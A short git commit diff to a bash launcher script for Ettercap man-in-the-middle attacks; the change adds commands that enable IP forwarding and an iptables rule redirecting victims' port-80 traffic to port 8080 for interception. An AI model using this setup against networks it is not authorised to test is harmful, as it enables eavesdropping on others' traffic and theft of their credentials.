426480773bdc3fa69ef906d70412e85bcc2da51c
smoz1986 <smoz1986@users.noreply.github.com>
2016-02-27 12:38:07 +0000

    Update MITM-ETTERCAP.sh

--- MITM-ETTERCAP.sh
+++ MITM-ETTERCAP.sh
@@ -1,7 +1,9 @@
 #! /bin/bash
 # start Ettercap graphical
  
-echo Launching Ettercap text...
+echo Launching Ettercap text...first configuring IP tables
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --t-port 8080
 echo Which interface to use i.e. eth0, wlan0 etc
 read -p 'Interface: ' intervar
 echo Enter filename
